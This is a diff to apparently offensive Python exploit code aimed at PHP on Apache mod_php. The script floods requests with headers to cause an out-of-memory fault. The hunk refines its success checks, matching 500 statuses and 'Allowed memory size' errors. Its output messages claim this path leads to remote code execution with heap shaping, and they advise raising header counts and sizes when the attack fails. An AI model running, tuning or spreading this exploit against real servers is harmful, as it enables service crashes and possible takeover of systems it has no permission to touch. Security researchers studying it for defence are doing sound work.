@@ -211,12 +211,15 @@ def main():
         print(f"Response: {status}")
         print(f"Size: {len(resp)} bytes")
 
-        if b"500" in status.encode():
-            print("\n[+] Server returned 500 — OOM likely triggered!")
+        # NOTE: do NOT match b"connection" here — every normal response
+        # contains a "Connection: close" header. Check the body instead.
+        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
+        if b"500" in status.encode() or b"Allowed memory size" in body:
+            print("\n[+] Server returned 500 / OOM fatal — OOM likely triggered!")
             print("    On Apache mod_php, the request shutdown procedure runs on invalid state.")
             print("    With heap shaping, this leads to RCE.")
-        elif not resp or b"connection" in resp.lower():
-            print("\n[+] Connection dropped — server process may have crashed!")
+        elif not resp:
+            print("\n[+] No response — server process likely crashed!")
         else:
             print("\n[-] Server responded normally — OOM threshold not reached.")
             print("    Try increasing --num-headers or --header-size")
